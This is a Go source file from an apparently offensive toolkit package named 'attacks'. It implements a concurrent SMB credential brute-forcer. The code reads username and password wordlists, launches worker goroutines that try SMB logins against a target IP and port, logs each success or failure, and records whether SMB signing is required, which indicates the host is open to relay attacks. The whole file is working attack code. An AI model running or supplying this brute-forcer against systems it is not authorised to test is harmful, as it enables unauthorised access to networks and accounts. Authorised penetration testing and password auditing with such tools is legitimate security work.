package attacks

import (
	"fmt"
	"log"

	// "github.com/hirochachacha/go-smb2"
	"strconv"

	"github.com/stacktitan/smb/smb"
	// "time"
)

// type loginChan struct{
//     user string
//     pass string
//     pos int
// }

// var yellow = color.New(color.FgYellow).SprintFunc()
// var green = color.New(color.FgGreen).SprintFunc()
// var red = color.New(color.FgRed).SprintFunc()

//workSMB goroutine for one attack of SMB
func workSMB(job login, serverIP, serverPort string) {
	fmt.Println(yellow("[attemp] ", job.pos, " ", job.user, ":", job.pass))
	defer wg.Done()
	port, _ := strconv.Atoi(serverPort)
	options := smb.Options{
		Host:        serverIP,
		Port:        port,
		User:        job.user,
		Domain:      "",
		Workstation: "",
		Password:    job.pass,
	}
	debug := false
	session, err := smb.NewSession(options, debug)
	if err != nil {
		// log.Println("[!]", err)
		log.Println(red("[x] Login failed ", job.user, ":", job.pass, " ", job.pos))

		return
	}
	// else
	defer session.Close()
	// log.Println(green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))

	var logMessage string
	if session.IsSigningRequired {
		logMessage = fmt.Sprint("[-] Signing is required")

	} else {
		logMessage = fmt.Sprint("[+] Signing is NOT required")
		// if session.IsAuthenticated {
		//     log.Println(green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))
		// } else {
		//     log.Println("[-] Login failed", job.user,":", job.pass," ",job.pos)
		// }
	}
	if session.IsAuthenticated {
		log.Println(magenta(logMessage), green("[+][+] Session Connect at ", serverIP, ":", serverPort, " ", job.user, ":", job.pass, " ", job.pos))
	} else {
		log.Println(magenta(logMessage), red("[-] Login failed", job.user, ":", job.pass, " ", job.pos))
	}

}

//SMBattackStart SMB attack with 2 files to iterate
func SMBattackStart(userFile, passFile, serverIP, serverPort string, nWorkers int) {
	if nWorkers == 0 {
		nWorkers = 9
	}

	log.Println("[0] Starting jobs")
	log.Println(userFile, passFile, serverIP, serverPort, nWorkers)

	outchan := make(chan login, nWorkers)
	go Read2Files(userFile, passFile, outchan)
	var sem = make(chan int, nWorkers)
	for i := 0; i < nWorkers; i++ {
		sem <- 1
	}
	for {
		select {
		case job, ok := <-outchan:
			if !ok {
				wg.Wait()
				fmt.Println(yellow("[info] jobs finisished"))
				return
			}
			wg.Add(1)
			<-sem
			// sem <- 1
			go func(job login) {
				workSMB(job, serverIP, serverPort)
				sem <- 1
				// <-sem
			}(job)
		}
	}
	// firstchan := make(chan loginChan, n_workers)
	// outchan := make(chan loginChan,n_workers)
	// okchan := make(chan bool)
	// go reader_list(userFile, firstchan, okchan)
	// go reader_list2(passFile, firstchan, outchan, okchan)
	// var sem = make(chan int, n_workers)
	// for i:= 0; i< n_workers; i++{
	//     sem <- 1
	// }
	// for {
	//     select{
	//     case j,ok := <- outchan:
	//         if !ok{
	//             wg.Wait()
	//             fmt.Println("[info] jobs finisished")
	//             return
	//         }
	//         wg.Add(1)
	//         <-sem
	//         // sem <- 1
	//         go func(job loginChan){
	//             work_smb(job,serverIP, serverPort)
	//             // <- sem
	//             sem <-1
	//         }(j)
	//     }
	// }
}
